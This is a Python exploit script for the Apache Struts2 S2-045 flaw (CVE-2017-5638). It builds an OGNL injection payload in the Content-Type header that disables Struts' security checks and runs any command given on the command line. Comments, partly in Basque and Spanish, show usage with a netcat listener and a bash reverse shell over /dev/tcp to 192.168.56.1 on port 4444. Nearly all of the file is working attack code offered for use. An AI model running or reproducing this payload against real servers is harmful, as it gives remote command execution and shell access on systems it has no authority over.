import subprocess


# curl.exe -X POST http://localhost:9090/struts/fileupload.action -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
# nc -lvnp 4444
# /bin/bash -i >/dev/tcp/192.168.56.1/4444 0<&1
# python3 struts_curl.py "http://localhost:9090/struts/fileupload.action" "/bin/bash -i >/dev/tcp/192.168.56.1/4444 0<&1"

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    # struts-en babes neurriak kendu
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    # cmd exekutatu
    payload += "(#cmd='%s')." % cmd
    # sistema eragilea lortu
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." 
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    # prozesu bat sortu javarekin
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))." 
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    # prozesuaren irteera bidali erabiltzaileari
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = ["-H", f"Content-Type: {payload}"]

    # Construcción del comando correctamente
    cmd_list = ["curl", "-X", "POST", url] + headers

    try:
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error al ejecutar el comando: {e}")


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] struts2_S2-045.py <url> <cmd>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print("[*] cmd: %s\n" % cmd)
        exploit(url, cmd)
